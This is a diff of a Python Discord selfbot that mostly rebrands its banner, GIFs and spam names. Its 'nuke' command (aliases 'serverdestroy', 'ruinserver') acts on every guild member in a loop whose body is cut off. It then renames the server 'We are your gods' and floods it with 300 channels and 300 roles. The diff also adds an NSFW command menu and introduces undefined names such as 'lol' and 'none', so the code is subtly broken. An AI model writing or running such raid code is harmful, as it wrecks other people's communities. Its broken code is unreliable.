@@ -41,18 +41,16 @@ def startprint():
         antiafk = 'Disabled'
 
      print(f'''{Fore.RESET}
-                      {Fore.RED}  _          _            _         _   _         _       
-                      {Fore.RED} /\ \       /\ \         /\ \      /\_\/\_\ _    /\ \     
-                     {Fore.RED} /  \ \     /  \ \        \ \ \    / / / / //\_\ /  \ \    
-                    {Fore.RED} / /\ \ \   / /\ \ \       /\ \_\  /\ \/ \ \/ / // /\ \ \   
-                  {Fore.RED}  / / /\ \_\ / / /\ \_\     / /\/_/ /  \____\__/ // / /\ \ \  
-                {Fore.RED}   / / /_/ / // / /_/ / /    / / /   / /\/________// / /  \ \_\ 
-                {Fore.RED}  / / /__\/ // / /__\/ /    / / /   / / /\/_// / // / /   / / / 
-                {Fore.RED} / / /_____// / /_____/    / / /   / / /    / / // / /   / / /  
-               {Fore.RED} / / /      / / /\ \ \  ___/ / /__ / / /    / / // / /___/ / /   
-               {Fore.RED}/ / /      / / /  \ \ \/\__\/_/___\\/_/    / / // / /____\/ /    
-               {Fore.RED}\/_/       \/_/    \_\/\/_________/        \/_/ \/_________/     
-  
+                     {Fore.RED} █████▒██▓    ▄▄▄        ██████  ██░ ██ 
+                   {Fore.RED} ▓██   ▒▓██▒   ▒████▄    ▒██    ▒ ▓██░ ██▒
+                   {Fore.RED}▒████ ░▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
+                   {Fore.RED}░▓█▒  ░▒██░   ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ 
+                   {Fore.RED}░▒█░   ░██████▒▓█   ▓██▒▒██████▒▒░▓█▒░██▓
+                   {Fore.RED} ▒ ░   ░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
+                   {Fore.RED} ░     ░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
+                   {Fore.RED} ░ ░     ░ ░    ░   ▒   ░  ░  ░   ░  ░░ ░
+                   {Fore.RED}░  ░     ░  ░      ░   ░  ░  ░
+                                         
                                     
                         {Fore.RED}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
                         {Fore.RED}ID ==> {Fore.WHITE}{Ioxide.user.id}
@@ -191,14 +189,14 @@ async def help(ctx):
 async def nsfw(ctx):
     await ctx.message.delete()
     em = discord.Embed(title="__NSFW__",color= discord.Color(0x808080))
-    em.add_field(name="fuck",value=none,inline=False)
-    em.add_field(name="boobs",value=none,inline=False)
-    em.add_field(name="pussy",value=none,inline=False)
-    em.add_field(name="cum",value=none,inline=False)
-    em.add_field(name="head",value=none,inline=False)
-    em.add_field(name="anal",value=none,inline=False)
-    em.add_field(name="kiss",value=none,inline=False)
-    em.add_field(name="spank",value=none,inline=False)
+    em.add_field(name="fuck",value=lol,inline=False)
+    em.add_field(name="boobs",value=lol,inline=False)
+    em.add_field(name="pussy",value=lol,inline=False)
+    em.add_field(name="cum",value=lol,inline=False)
+    em.add_field(name="head",value=lol,inline=False)
+    em.add_field(name="anal",value=lol,inline=False)
+    em.add_field(name="kiss",value=lol,inline=False)
+    em.add_field(name="spank",value=lol,inline=False)
     em.set_image(url="https://media1.tenor.com/images/060bede0ab59dab35cfb0b9413c50a22/tenor.gif?itemid=5787004")
     em.set_footer(text="get them cheeks wrecked")
     await ctx.send(embed=em)
@@ -237,7 +235,7 @@ async def afk(ctx):
     await ctx.message.delete()
     em = discord.Embed(title="_AFK Help_",color= discord.Color(0x000000))
     em.add_field(name="_*AfkCheck*_",value="Starts an afk check",inline=False)
-    em.set_image(url="https://38.media.tumblr.com/76bdebcb26c76890f13a12898487aa3c/tumblr_niapwy2wOP1rcjxolo2_500.gif")
+    em.set_image(url="https://tenor.com/view/flash-zoom-gif-21197251")
     em.set_footer(text="dont fold lmfao")
     await ctx.send(embed=em)
 @Ioxide.command(aliases=['sayajoke','jokepack'])
@@ -254,7 +252,7 @@ async def wizzing(ctx):
     await ctx.message.delete()
     em = discord.Embed(title="_*Wizzing Help*_",color= discord.Color(0x000000))
     em.add_field(name="_*Destroy*_",value="Fucks a servers channels and roles",inline=False)
-    em.set_image(url="https://pa1.narvii.com/5873/f7b9d2a89cf47fcaf97c3330dc6544aa335ec586_hq.gif")
+    em.set_image(url="https://tenor.com/view/legends-of-tomorrow-season2-black-flash-run-gif-20367323")
     em.set_footer(text="Nothing but a L for u")
     await ctx.send(embed=em)
 @Ioxide.command()
@@ -288,7 +286,7 @@ async def check(ctx):
 async def blood(ctx):
     await ctx.message.delete()
     em = discord.Embed(title="_GET YOUR LIFE BACK IN BLOOD_",color= discord.Color(0x000000))
-    em.set_image(url="https://giffiles.alphacoders.com/135/135399.gif")
+    em.set_image(url="https://tenor.com/view/the-flash-godspeed-fast-yes-no-gif-17120575")
     await ctx.send(embed=em)
     
 @Ioxide.command()
@@ -304,7 +302,7 @@ async def maker(ctx):
     await ctx.message.delete()
     em = discord.Embed(title="_GodSpeed_",color= discord.Color(0x000000))
     em.add_field(name="_**Primo made this**_",value="ScreamW",inline=False)
-    em.set_image(url="https://data.whicdn.com/images/216806169/original.gif")
+    em.set_image(url="https://tenor.com/view/eobard-thawne-dagger-destroyed-reverse-flash-gif-14204484")
     em.set_footer(text="Made By Primo")
     await ctx.send(embed=em)
 @Ioxide.command()
@@ -410,7 +408,7 @@ async def hammer(ctx, recipients):
         em.set_image(url="https://78.media.tumblr.com/37dadedf277dd7c06d802130225cf5fb/tumblr_inline_o3346rGusF1r8a94o_500.gif")
     await ctx.send(embed=em) 
 @Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
-async def Fog(ctx):
+async def nuke(ctx):
     await ctx.message.delete()
     for user in list(ctx.guild.members):
         try:
@@ -429,18 +427,18 @@ async def Fog(ctx):
             pass
     try:
         await ctx.guild.edit(
-            name="Primo W",
+            name="FlashW",
             description="We are your gods",
             reason="LOL",
             icon=none,
-            banner=None
+            banner=none
         )
     except:
         pass
     for _i in range(300):
-        await ctx.guild.create_text_channel(name="Primo fucked you")
+        await ctx.guild.create_text_channel(name="Flash Runs This son")
     for _i in range(300):
-        await ctx.guild.create_role(name="sheeeesh", color=RandomColor())
+        await ctx.guild.create_role(name="Speed", color=RandomColor())
 
 if __name__ == '__main__':
     Init()
